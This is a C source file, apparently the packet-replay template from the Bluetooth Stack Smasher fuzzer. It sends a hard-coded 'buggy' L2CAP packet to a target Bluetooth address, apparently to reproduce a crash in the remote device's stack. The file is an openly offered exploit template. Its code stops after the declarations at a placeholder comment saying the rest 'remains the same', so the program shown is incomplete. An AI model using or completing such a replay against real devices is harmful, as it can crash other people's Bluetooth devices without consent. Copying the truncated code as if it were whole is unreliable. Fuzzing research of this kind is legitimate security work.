/*	BSS Replay packet template 				*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*								*/
/*	Modify this file, and type 'make' in this directory	*/
/*	Then : ./replay_l2cap_packet <BT_ADDR>			*/

/* Copyright (C) 2006 Pierre BETOUIN
 * 
 * Written 2006 by Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation;
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY
 * RIGHTS.  IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE
 * FOR ANY CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
 * AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 * 
 * ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS,
 * COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS SOFTWARE
 * IS DISCLAIMED.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		12
char replay_buggy_packet[]="\xB1\x01\xDB\x69\x94\x5C\x07\x4E\x0D\x9B\x2E\xF1";

int main(int argc, char **argv)
{
    struct sockaddr_l2 bluetoothSocket;
    int packetSent, iteration;
    struct sockaddr_l2 remoteBluetoothAddress;
    unsigned char l2capPacketToSend[SIZE];

    // ... (rest of the code remains the same)
